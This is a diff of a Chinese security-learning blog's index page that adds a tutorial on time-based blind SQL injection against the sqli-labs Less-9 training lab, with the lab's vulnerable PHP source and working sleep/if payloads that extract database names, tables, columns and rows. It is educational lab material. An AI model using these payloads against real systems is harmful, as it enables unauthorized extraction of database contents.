@@ -285,6 +285,125 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/文件上传漏洞-一/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="袁">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="流年、乱了浮生">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/06/文件上传漏洞-一/" itemprop="url">文件上传漏洞<一></一></a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-06T16:22:40+08:00">
+                2019-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/CRYPTO-RSA编码/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -480,7 +599,40 @@
       
         
           
-            
+            <h2 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h2><p><strong>时间盲注</strong>：时间盲注与布尔盲注的注入原理大致相同，区别就是时间盲注没有回显或者正确和错误页面回显一样。所以时间型盲注需要页面沉睡时间判断，通过 sleep（）函数测试，通过if（）和sleep（）联合逐个猜解数据，例：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-9/?id=1' and (if(ascii(substr(database(),1,1))&gt;100,1,sleep(5))  --+</span><br></pre></td></tr></table></figure>
+<p>如果当前查询的当前数据库<code>ascii(substr(database()),1,1)</code>的第一个字符的ASCII码大于100，ture执行<code>select 1</code>页面正常返回，false执行<code>select sleep(5)</code>页面沉睡5秒后返回。1和sleep（5）也可以换下位置。</p>
+<p><strong>常用函数</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sleep（n）：使数据库在暂停n秒之后再将搜索结果输出</span><br><span class="line">if（（条件），m，n）：若条件为真 返回m，若条件为假 返回n</span><br><span class="line">length（database()）：返回当前数据库名长度</span><br><span class="line">mid（database（），m，n）：返回数据库名的第m位之后的n位</span><br></pre></td></tr></table></figure>
+<h2 id="sqli-labs-nbsp-less9"><a href="#sqli-labs-nbsp-less9" class="headerlink" title="sqli-labs&nbsp;less9"></a>sqli-labs&nbsp;less9</h2><p>以sqli平台第九题为例写一下时间盲注</p>
+<p>less9是基于Time-GET-单引号-字符型-盲注</p>
+<p>进行注入测试，与上一关一样</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1'</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1"</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1' --+</span><br></pre></td></tr></table></figure>
+<p>但是发现不管上面那一个，页面返回是一样的回显为<code>you are in………..</code></p>
+<p><img src="/2019/07/28/SQL注入-四-时间盲注/QQ截图20190813181247.png" alt="1"></p>
+<p>这样就不能根据页面的回显来判断匹配结果，要使用延时函数<code>sleep()</code>对两种输入进行区分。附源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注入过程与<a href="https://ymh2019.github.io/2019/07/27/SQL%E6%B3%A8%E5%85%A5-%E4%B8%89-bool%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">less8</a>是一样的，payload也差不多，比上一关多了一个if函数</p>
+<p><strong>判断数据库长度</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(length(database())&gt;1,1,sleep(4)) --+</span><br><span class="line">?id=1' and if(length(database())&gt;2,1,sleep(4)) --+</span><br><span class="line">以此类推...</span><br></pre></td></tr></table></figure>
+<p>执行成功进行1，失败进行<code>sleep(4)</code>沉睡4秒，如图</p>
+<p><img src="/2019/07/28/SQL注入-四-时间盲注/QQ截图20190814225730.png" alt="2"></p>
+<p><img src="/2019/07/28/SQL注入-四-时间盲注/QQ截图20190814225757.png" alt="3"></p>
+<p>所以数据库长度是8</p>
+<p>下面都是一样的，根据页面返回时间不一样判断是否注入成功</p>
+<p><strong>爆数据库名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(ascii(substr(database(),1,1))=100,1,sleep(5)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>通过修改substr的步长来进一步猜测数据库名的其他字符</p>
+<p><strong>爆表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>爆列名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>爆数据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>可以看出时间盲注的中心思想和布尔盲注相同，也通过截取函数查询逐个匹配想要的信息。</p>
+<p>手工注入会很慢还是要写脚本跑，我还没找到很好的脚本。可以在网上找下。</p>
+<p>也顺便提下less10，和Less9差别只在于单双引号，less10是双引号闭合改下payload，修改查询语句闭合后用脚本注入即可。</p>
+
           
         
       
@@ -1403,134 +1555,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/12/MISC-图片隐写/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="袁">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="流年、乱了浮生">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/12/MISC-图片隐写/" itemprop="url">MISC-图片隐写</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-12T12:17:09+08:00">
-                2019-07-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>题目复现：</p>
-<h2 id="实验吧-黑与白"><a href="#实验吧-黑与白" class="headerlink" title="实验吧 - 黑与白"></a>实验吧 - 黑与白</h2><p>题目地址：<a href="http://www.shiyanbar.com/ctf/1925" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1925</a></p>
-<p>题目打开是一张图片，像是二维码</p>
-<p><img src="/2019/07/12/MISC-图片隐写/Pcat.jpg" alt="1"></p>
-<p>放入CQR中看下，发现能扫出来，是一个网站</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/12/MISC-图片隐写/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1583,7 +1607,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
